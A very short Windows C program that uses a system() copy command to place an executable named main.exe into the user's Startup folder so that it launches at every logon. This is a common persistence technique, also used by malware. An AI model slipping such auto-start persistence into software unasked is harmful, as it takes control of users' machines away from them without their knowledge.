#include <windows.h>
#include <winreg.h>

int main(){
    system("copy c:\\Users\\user\\AppData\\Local\\HELLO\\main.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    return 0;
}